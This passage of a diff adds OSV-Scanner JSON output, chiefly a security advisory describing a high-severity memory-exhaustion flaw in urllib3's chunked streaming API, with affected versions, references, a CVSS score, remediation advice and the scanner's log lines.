+                    "2.0.4",
+                    "2.0.5",
+                    "2.0.6",
+                    "2.0.7",
+                    "2.1.0",
+                    "2.2.0",
+                    "2.2.1",
+                    "2.2.2",
+                    "2.2.3",
+                    "2.3.0",
+                    "2.4.0",
+                    "2.5.0",
+                    "2.6.0",
+                    "2.6.1",
+                    "2.6.2",
+                    "2.6.3",
+                    "2.7.0"
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2026-97689"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-770"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2026-09-30T14:46:18Z",
+                "nvd_published_at": "2026-09-29T16:17:18Z",
+                "severity": "HIGH"
+              },
+              "details": "## Impact\n\nurllib3's [streaming API](https://urllib3.readthedocs.io/en/2.7.0/advanced-usage.html#streaming-and-i-o) is designed for efficiently handling large HTTP responses by reading the content in chunks, rather than loading the entire response body into memory at once. When decoding a [chunked-transfer-encoded response](https://httpwg.org/specs/rfc9112.html#chunked.encoding), this API reads each chunk's size field by buffering until it sees `\\n` or EOF.\n\nA malicious HTTP server can return `Transfer-Encoding: chunked` and then send a very long run of bytes without any newline, causing the streaming client to buffer that entire run before urllib3 can reject the chunk size as invalid and allocate more memory than intended.\n\nTo fix the issue, we'll reject chunk-size fields larger than 65536 bytes, as already done in the non-streaming case, which is currently handled by the Python standard library. Note that this only applies to reading the chunk-size field, not the chunk data, which is already handled correctly. Thus, there shouldn't be any impact for non-malicious servers.\n\n## Affected usages\n\nApplications and libraries using urllib3 versions earlier than 2.8.0 may be affected when streaming a chunked response from untrusted sources. Specifically, this affects the [read_chunked()](https://urllib3.readthedocs.io/en/stable/reference/urllib3.response.html#urllib3.response.BaseHTTPResponse.read_chunked) and [stream()](https://urllib3.readthedocs.io/en/stable/reference/urllib3.response.html#urllib3.response.BaseHTTPResponse.stream) methods of the HTTPResponse object.\n\nThis also affects requests streaming API, which uses urllib3 under the hood.\n\n## Remediation\n\nUpgrade to urllib3 version 2.8.0 or later, where chunk-size fields larger than 65536 will be rejected. If upgrading is not immediately possible, consider reading the response at once using the [read()](https://urllib3.readthedocs.io/en/stable/reference/urllib3.response.html#urllib3.response.BaseHTTPResponse.read) method.",
+              "id": "GHSA-vxq7-64xx-v4gw",
+              "modified": "2026-09-30T15:00:05.904945330Z",
+              "published": "2026-09-30T14:46:18Z",
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/urllib3/urllib3/security/advisories/GHSA-vxq7-64xx-v4gw"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-97689"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/urllib3/urllib3/commit/cd770b059b543be29298ea5c52afb0b1b090f5ed"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/urllib3/urllib3"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/urllib3/urllib3/releases/tag/2.8.0"
+                }
+              ],
+              "schema_version": "1.9.0",
+              "severity": [
+                {
+                  "score": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:H",
+                  "type": "CVSS_V4"
+                }
+              ],
+              "summary": "urllib3: HTTPResponse.stream()/read_chunked() buffers an unbounded chunk-size line into memory"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "experimental_config": {
+    "licenses": {
+      "summary": false,
+      "allowlist": null
+    }
+  }
+}
+
+stderr:
+Warning: `source` exists as both a subcommand of OSV-Scanner and as a file on the filesystem. `source` is assumed to be a subcommand here. If you intended for `source` to be an argument to `source`, you must specify `source source` in your command line.
+Starting filesystem walk for root: /
+Scanned <PRIVATE_RESEARCH>/baseline.lock file and found 174 packages
+End status: 0 dirs visited, 1 inodes visited, 1 Extract calls, 22.966846ms elapsed, 22.966976ms wall time
